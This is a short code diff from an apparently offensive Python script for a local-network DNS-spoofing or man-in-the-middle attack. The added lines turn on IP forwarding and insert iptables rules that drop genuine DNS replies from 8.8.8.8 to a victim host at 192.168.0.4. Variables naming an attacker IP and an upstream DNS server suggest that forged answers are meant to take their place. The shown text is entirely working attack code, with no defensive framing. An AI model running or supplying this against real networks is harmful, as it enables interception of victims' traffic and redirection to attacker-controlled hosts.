@@ -3,8 +3,23 @@ import socket
 import subprocess
 
 import os
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+commands = [
+    "iptables -A FORWARD -s 8.8.8.8 -p udp --sport 53 -d 192.168.0.4 -j DROP",
+    "iptables -A FORWARD -s 8.8.8.8 -p tcp --sport 53 -d 192.168.0.4 -j DROP"
+]
+
+# Run each command
+for cmd in commands:
+
+    try:
+        subprocess.run(cmd.split(), check=True)
+        print(f"Executed: {cmd}")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to run: {cmd}\nError: {e}")
+        
+        
 attacker_ip = "192.168.0.254"
 upstream_dns = "8.8.8.8"
 upstream_port = 53
